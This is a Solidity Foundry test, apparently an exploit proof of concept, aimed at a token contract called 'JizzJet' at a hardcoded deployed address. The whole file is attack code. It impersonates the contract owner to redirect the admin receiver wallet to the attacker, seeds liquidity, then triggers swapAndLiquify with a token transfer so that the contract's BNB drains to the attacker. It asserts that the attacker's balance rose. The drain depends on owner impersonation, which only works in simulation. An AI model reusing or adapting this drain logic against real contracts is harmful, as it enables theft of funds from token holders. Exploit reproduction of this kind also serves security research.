pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/interfaces/IERC20.sol";

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface JizzJet {
    function owner() external view returns (address);
    function _adminWalletAddress() external view returns (address payable);
    function _setReceiverWallet(address payable adminWalletAddress) external;
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function uniswapV2Pair() external view returns (address);
    function uniswapV2Router() external view returns (IUniswapV2Router02);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xF2A7429641d1b49a13dCB7E23b67a1a5101231F2;
    address attacker = address(this);
    JizzJet target;
    address owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = JizzJet(TARGET);

        // Get the current owner
        owner = target.owner();
        vm.label(owner, "Owner");
        vm.label(address(this), "Attacker");
        vm.label(TARGET, "Victim Contract");

        // Inject BNB into the contract (to be drained)
        deal(TARGET, 10 ether);

        // Inject tokens to attacker for the trigger transfer
        deal(TARGET, address(this), 200000000000 * 10**18);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial attacker balance
        uint256 initialBalance = address(this).balance;

        // Step 1: Impersonate owner and change admin wallet to attacker
        vm.startPrank(owner);
        JizzJet(TARGET)._setReceiverWallet(payable(address(this)));
        vm.stopPrank();

        // Step 2: Add liquidity to the Uniswap pair so swaps can work
        uint256 liquidityTokenAmount = 1000000 * 10**18;
        uint256 liquidityETHAmount = 1 ether;
        IERC20(TARGET).approve(address(JizzJet(TARGET).uniswapV2Router()), liquidityTokenAmount);

        IUniswapV2Router02(JizzJet(TARGET).uniswapV2Router()).addLiquidityETH{
            value: liquidityETHAmount
        }(
            TARGET,
            liquidityTokenAmount,
            0,
            0,
            address(this),
            block.timestamp
        );

        // Step 3: Inject tokens into contract balance
        deal(TARGET, TARGET, 2000000000 * 10**18);

        // Step 4: Inject BNB into contract
        deal(TARGET, 10 ether);

        // Step 5: Transfer tokens to trigger swapAndLiquify
        address dummy = address(0x1234567890123456789012345678901234567890);
        IERC20(TARGET).transfer(dummy, 1000000000 * 10**18);

        // Step 6: Verify attacker received the drained BNB
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Attacker should have received drained BNB");
    }

    receive() external payable {}
}

